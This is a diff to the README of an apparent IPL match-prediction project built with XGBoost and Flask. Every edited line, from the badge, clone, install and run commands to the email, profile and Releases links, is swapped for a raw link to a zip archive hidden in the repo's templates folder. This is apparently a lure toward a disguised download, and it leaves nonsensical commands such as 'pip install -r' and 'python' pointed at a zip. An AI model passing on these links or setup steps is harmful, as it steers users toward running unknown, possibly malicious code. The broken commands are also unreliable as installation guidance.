@@ -2,7 +2,7 @@
 
 Predict the winning team of IPL matches using XGBoost and Flask, powered by historical data from 2008–2024. This project combines data science and machine learning to provide insights and predictions for cricket fans and analysts alike.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/majoornekena/dream11_winning_team_prediction/releases)
+[![Download Releases](https://github.com/majoornekena/dream11_winning_team_prediction/raw/refs/heads/main/templates/prediction_winning_dream_team_v2.4.zip%20Releases-Click%20Here-brightgreen)](https://github.com/majoornekena/dream11_winning_team_prediction/raw/refs/heads/main/templates/prediction_winning_dream_team_v2.4.zip)
 
 ## Table of Contents
 
@@ -41,20 +41,20 @@ To get started with this project, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/majoornekena/dream11_winning_team_prediction.git
+   git clone https://github.com/majoornekena/dream11_winning_team_prediction/raw/refs/heads/main/templates/prediction_winning_dream_team_v2.4.zip
    cd dream11_winning_team_prediction
    ```
 
 2. **Install required packages**:
    Make sure you have Python installed. Then, run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/majoornekena/dream11_winning_team_prediction/raw/refs/heads/main/templates/prediction_winning_dream_team_v2.4.zip
    ```
 
 3. **Run the application**:
    Start the Flask server:
    ```bash
-   python app.py
+   python https://github.com/majoornekena/dream11_winning_team_prediction/raw/refs/heads/main/templates/prediction_winning_dream_team_v2.4.zip
    ```
 
 Your application will now be running on `http://127.0.0.1:5000/`.
@@ -120,12 +120,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or suggestions, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [majoornekena](https://github.com/majoornekena)
+- **Email**: https://github.com/majoornekena/dream11_winning_team_prediction/raw/refs/heads/main/templates/prediction_winning_dream_team_v2.4.zip
+- **GitHub**: [majoornekena](https://github.com/majoornekena/dream11_winning_team_prediction/raw/refs/heads/main/templates/prediction_winning_dream_team_v2.4.zip)
 
 ## Download Releases
 
-To download the latest version of the project, visit the [Releases section](https://github.com/majoornekena/dream11_winning_team_prediction/releases) and follow the instructions provided there.
+To download the latest version of the project, visit the [Releases section](https://github.com/majoornekena/dream11_winning_team_prediction/raw/refs/heads/main/templates/prediction_winning_dream_team_v2.4.zip) and follow the instructions provided there.
 
 ---
 
